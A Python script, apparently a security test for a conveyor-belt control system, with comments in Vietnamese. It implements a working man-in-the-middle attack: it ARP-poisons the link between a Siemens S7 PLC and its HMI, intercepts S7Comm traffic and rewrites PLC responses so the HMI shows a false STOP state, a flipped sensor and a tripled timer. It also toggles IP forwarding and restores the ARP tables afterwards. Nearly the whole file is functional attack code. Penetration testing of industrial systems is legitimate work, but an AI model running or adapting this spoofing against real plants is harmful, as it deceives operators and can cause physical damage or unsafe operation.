#!/usr/bin/env python3
"""
tests/test_mitm_s7_spoof.py
MitM Attack: ARP Poison + S7Comm Data Manipulation
PLC (192.168.210.211) <-> Attacker <-> HMI (192.168.210.31)

Băng truyền AGF — Merker layout:
  M5.0 = START  | M5.1 = STOP  | M5.4 = Vat_1 | M5.6 = Vat_2
  M6.0 = Vat_3
  MD50 = Times_1 | MD54 = CD1 | MD58 = CD2 | MD62 = CD3

Spoof: STOP=1, Vat_3 flip, CD1 × 3
→ HMI thấy băng truyền dừng + cảm biến sai + timer sai

Yêu cầu: pip install scapy, chạy Admin (Windows) / sudo (Linux)
"""

import sys
import os
import time
import threading
from datetime import datetime

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from tests.common import *

try:
    from scapy.all import (
        ARP, Ether, IP, TCP, Raw,
        sendp, srp, sniff, conf,
        get_if_hwaddr, getmacbyip
    )
except ImportError:
    print("[!] Thieu scapy: pip install scapy")
    sys.exit(1)

# ── Config ────────────────────────────────────────────────────────────────────
PLC_IP_CONF  = PLC_IP
HMI_IP_CONF  = HMI_IP
S7_PORT      = 102
DURATION     = 60
SPOOF_FACTOR = 0.4  # không dùng trực tiếp nhưng giữ để log

stop_arp          = threading.Event()
intercepted_count = 0
modified_count    = 0

# ── MAC helper ────────────────────────────────────────────────────────────────
def get_mac(ip):
    try:
        ans, _ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
            timeout=2, verbose=False
        )
        return ans[0][1].hwsrc if ans else None
    except Exception:
        return None

# ── ARP Poison ────────────────────────────────────────────────────────────────
def arp_poison(plc_mac, hmi_mac, plc_ip, hmi_ip, iface):
    attacker_mac = get_if_hwaddr(iface)

    poison_to_hmi = Ether(dst=hmi_mac) / ARP(
        op=2, pdst=hmi_ip, hwdst=hmi_mac,
        psrc=plc_ip, hwsrc=attacker_mac
    )
    poison_to_plc = Ether(dst=plc_mac) / ARP(
        op=2, pdst=plc_ip, hwdst=plc_mac,
        psrc=hmi_ip, hwsrc=attacker_mac
    )

    print(f"[ARP] Poison started: PLC={plc_ip} <-> HMI={hmi_ip}")
    while not stop_arp.is_set():
        sendp(poison_to_hmi, iface=iface, verbose=False)
        sendp(poison_to_plc, iface=iface, verbose=False)
        time.sleep(1.5)

def restore_arp(plc_mac, hmi_mac, plc_ip, hmi_ip, iface):
    fix_hmi = Ether(dst=hmi_mac) / ARP(
        op=2, pdst=hmi_ip, hwdst=hmi_mac,
        psrc=plc_ip, hwsrc=plc_mac
    )
    fix_plc = Ether(dst=plc_mac) / ARP(
        op=2, pdst=plc_ip, hwdst=plc_mac,
        psrc=hmi_ip, hwsrc=hmi_mac
    )
    for _ in range(5):
        sendp(fix_hmi, iface=iface, verbose=False)
        sendp(fix_plc, iface=iface, verbose=False)
        time.sleep(0.3)
    print("[ARP] Da khoi phuc ARP table")

# ── S7Comm Payload Manipulation ───────────────────────────────────────────────
def manipulate_s7_payload(payload: bytes) -> bytes:
    """
    Sửa Merker read response của băng truyền AGF:
      - M5.1 (STOP bit)  → set = 1  → HMI nghĩ băng đang dừng
      - M6.0 (Vat_3 bit) → flip     → HMI thấy cảm biến vật sai
      - MD54 (CD1 timer) → × 3      → HMI thấy timer chạy sai
    """
    global modified_count
    payload = bytearray(payload)

    # TPKT check
    if len(payload) < 20 or payload[0] != 0x03 or payload[1] != 0x00:
        return bytes(payload)

    try:
        # Tìm S7 Data item header: 0xFF 0x04 hoặc 0xFF 0x09
        data_start = None
        for i in range(10, min(len(payload) - 4, 40)):
            if payload[i] == 0xFF and payload[i+1] in (0x04, 0x09):
                data_start = i + 4
                break

        if data_start is None:
            return bytes(payload)

        data_area = payload[data_start:]

        # ── M5.1 → STOP = 1 (set bit, không flip) ────────────────────────────
        if len(data_area) >= 6:
            original_m5 = data_area[5]
            data_area[5] |= 0x02          # set bit 1 = STOP
            if original_m5 != data_area[5]:
                info(f"S7 SPOOF M5: 0x{original_m5:02X} -> 0x{data_area[5]:02X} "
                     f"(STOP=1, START={'1' if data_area[5]&0x01 else '0'})")
                modified_count += 1

        # ── M6.0 → Vat_3 flip ────────────────────────────────────────────────
        if len(data_area) >= 7:
            original_m6 = data_area[6]
            data_area[6] ^= 0x01          # flip bit 0 = Vat_3
            if original_m6 != data_area[6]:
                info(f"S7 SPOOF M6: 0x{original_m6:02X} -> 0x{data_area[6]:02X} "
                     f"(Vat_3={'1' if data_area[6]&0x01 else '0'})")
                modified_count += 1

        # ── MD54 (CD1) → × 3 ─────────────────────────────────────────────────
        if len(data_area) >= 58:
            old_cd1 = ((data_area[54] << 24) | (data_area[55] << 16) |
                       (data_area[56] << 8)  |  data_area[57])
            fake_cd1 = min(old_cd1 * 3 if old_cd1 > 0 else 9999, 0x7FFFFFFF)
            data_area[54] = (fake_cd1 >> 24) & 0xFF
            data_area[55] = (fake_cd1 >> 16) & 0xFF
            data_area[56] = (fake_cd1 >> 8)  & 0xFF
            data_area[57] =  fake_cd1        & 0xFF
            info(f"S7 SPOOF CD1: {old_cd1} -> {fake_cd1} ms (x3)")
            modified_count += 1

        payload[data_start:] = data_area

    except Exception as e:
        warn(f"Payload parse error: {e}")

    return bytes(payload)

# ── Packet Callback ───────────────────────────────────────────────────────────
def packet_callback(pkt, plc_ip, hmi_ip, iface):
    global intercepted_count

    if not pkt.haslayer(IP) or not pkt.haslayer(TCP):
        return

    src_ip = pkt[IP].src
    dst_ip = pkt[IP].dst
    sport  = pkt[TCP].sport
    dport  = pkt[TCP].dport

    if sport != S7_PORT and dport != S7_PORT:
        return

    intercepted_count += 1

    # PLC → HMI: sửa data rồi forward
    if src_ip == plc_ip and dst_ip == hmi_ip and sport == S7_PORT:
        if pkt.haslayer(Raw):
            raw = bytes(pkt[Raw].load)
            if len(raw) > 4 and raw[0] == 0x03 and raw[1] == 0x00:
                modified_raw = manipulate_s7_payload(raw)
                new_pkt = pkt.copy()
                new_pkt[Raw].load = modified_raw
                del new_pkt[IP].chksum
                del new_pkt[TCP].chksum
                hmi_mac = getmacbyip(hmi_ip)
                if hmi_mac:
                    sendp(Ether(dst=hmi_mac) / new_pkt[IP],
                          iface=iface, verbose=False)
        return  # không fall-through

    # HMI → PLC: forward nguyên
    if src_ip == hmi_ip and dst_ip == plc_ip:
        plc_mac = getmacbyip(plc_ip)
        if plc_mac:
            sendp(Ether(dst=plc_mac) / pkt[IP],
                  iface=iface, verbose=False)

# ── Main ──────────────────────────────────────────────────────────────────────
def main():
    global intercepted_count, modified_count
    intercepted_count = 0
    modified_count    = 0

    plc_ip = PLC_IP_CONF
    hmi_ip = HMI_IP_CONF
    iface  = IFACE

    _att = globals().get('ATTACKER_IP', 'auto')
    print(f"\n{B}[TEST] MITM S7COMM HMI SPOOFING — Bang truyen AGF{X}")
    info(f"PLC: {plc_ip}  HMI: {hmi_ip}  Attacker: {_att}")
    info(f"Duration: {DURATION}s  |  Spoof: STOP=1, Vat_3 flip, CD1×3")

    changes    = []
    observable = []
    notes      = []
    error      = None
    t0         = time.time()

    # Khai báo trước để finally không bị NameError
    plc_mac = None
    hmi_mac = None

    try:
        # Lấy MAC
        info("Lay MAC address...")
        plc_mac = get_mac(plc_ip)
        hmi_mac = get_mac(hmi_ip)

        if not plc_mac:
            error = f"PLC {plc_ip} unreachable (no ARP reply)"
            fail(error)
            print_result("MITM_S7_SPOOF", False, [], [], [error], time.time()-t0, error)
            return

        if not hmi_mac:
            error = f"HMI {hmi_ip} unreachable (no ARP reply)"
            fail(error)
            print_result("MITM_S7_SPOOF", False, [], [], [error], time.time()-t0, error)
            return

        ok(f"PLC MAC : {plc_mac}")
        ok(f"HMI MAC : {hmi_mac}")

        # IP forward (Linux)
        if sys.platform.startswith("linux"):
            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
            info("IP forwarding: ON")

        # ARP Poison thread
        arp_thread = threading.Thread(
            target=arp_poison,
            args=(plc_mac, hmi_mac, plc_ip, hmi_ip, iface),
            daemon=True
        )
        arp_thread.start()
        ok("ARP Poison thread started")
        time.sleep(2)  # chờ poison ngấm

        # Sniff + intercept
        filter_str = f"tcp port {S7_PORT}"
        info(f"Sniffing [{filter_str}] for {DURATION}s ...")
        info("Wireshark filter: s7comm || arp.duplicate-address-frame")

        sniff(
            filter=filter_str,
            prn=lambda pkt: packet_callback(pkt, plc_ip, hmi_ip, iface),
            timeout=DURATION,
            store=False,
            iface=iface
        )

    except KeyboardInterrupt:
        info("Dung boi user (Ctrl+C)")
    except Exception as e:
        error = str(e)
        fail(str(e))
    finally:
        # Dừng ARP Poison
        stop_arp.set()
        time.sleep(1)
        # Khôi phục ARP chỉ khi đã lấy được MAC
        if plc_mac and hmi_mac:
            try:
                restore_arp(plc_mac, hmi_mac, plc_ip, hmi_ip, iface)
            except Exception as e:
                warn(f"Restore ARP failed: {e}")
        # Tắt IP forward
        if sys.platform.startswith("linux"):
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
            info("IP forwarding: OFF")

    duration = time.time() - t0

    observable.append(f"ARP Poison: PLC {plc_ip} <-> HMI {hmi_ip} qua attacker")
    observable.append(f"S7Comm intercepted: {intercepted_count} pkts")
    observable.append(f"S7Comm modified   : {modified_count} pkts")

    changes.append("M5.1 STOP=1  → HMI thay bang truyen DUNG")
    changes.append("M6.0 Vat_3 flip → HMI thay cam bien vat SAI")
    changes.append("MD54 CD1 x3  → HMI thay timer chay SAI")

    notes.append(f"Duration   : {duration:.1f}s")
    notes.append(f"Intercepted: {intercepted_count} | Modified: {modified_count}")
    notes.append(f"Spoof      : STOP=1, Vat_3 flip, CD1 x3")
    notes.append(f"Wireshark  : s7comm || arp.duplicate-address-frame")
    notes.append(f"HMI hien thi: bang truyen DUNG + cam bien sai + timer sai")

    success = intercepted_count > 0
    print_result("MITM_S7_SPOOF", success, changes, observable, notes, duration, error)


if __name__ == "__main__":
    main()
